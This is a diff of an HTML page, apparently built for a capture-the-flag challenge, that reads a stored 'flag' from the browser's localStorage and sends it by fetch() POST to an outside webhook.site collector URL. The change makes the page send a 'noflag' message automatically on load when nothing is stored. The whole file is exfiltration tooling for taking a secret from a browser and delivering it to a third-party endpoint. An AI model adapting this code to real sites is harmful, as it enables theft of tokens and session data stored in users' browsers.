@@ -3,31 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Stored Flag</title>
+    <title>Send Flag or NoFlag</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Function to send the flag to the webhook URL via POST request
-            const sendFlagToWebhook = (flag) => {
+            // Function to send a message to the webhook URL via POST request
+            const sendMessageToWebhook = (message) => {
                 const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json', // Indicate that the body is JSON
                     },
-                    body: JSON.stringify({ flag: flag }), // Send the flag in the request body
+                    body: JSON.stringify({ message: message }), // Send the message in the request body
                 })
                 .then(response => {
                     if (response.ok) {
-                        console.log('Flag sent successfully:', flag);
-                        alert('Flag sent successfully!');
+                        console.log('Message sent successfully:', message);
+                        alert('Message sent successfully!');
                     } else {
-                        console.error('Failed to send flag. Status:', response.status);
-                        alert('Failed to send flag.');
+                        console.error('Failed to send message. Status:', response.status);
+                        alert('Failed to send message.');
                     }
                 })
                 .catch(error => {
-                    console.error('Error sending flag:', error);
-                    alert('Error sending flag.');
+                    console.error('Error sending message:', error);
+                    alert('Error sending message.');
                 });
             };
 
@@ -39,18 +39,19 @@
                 const sendButton = document.createElement('button');
                 sendButton.innerText = 'Send Flag';
                 sendButton.onclick = () => {
-                    sendFlagToWebhook(storedFlag); // Send the stored flag on button click
+                    sendMessageToWebhook(storedFlag); // Send the stored flag on button click
                 };
                 document.body.appendChild(sendButton);
             } else {
                 console.log('No flag stored in localStorage.');
-                alert('No flag found in localStorage.');
+                sendMessageToWebhook('noflag'); // Send 'noflag' if no flag is stored
+                alert('No flag found in localStorage. Sent "noflag".');
             }
         });
     </script>
 </head>
 <body>
-    <h1>Send Stored Flag</h1>
-    <p>If a flag is stored, you can send it to the specified webhook by clicking the button below.</p>
+    <h1>Send Flag or NoFlag</h1>
+    <p>If a flag is stored, you can send it to the specified webhook by clicking the button below. If no flag is stored, a "noflag" message will be sent automatically.</p>
 </body>
 </html>
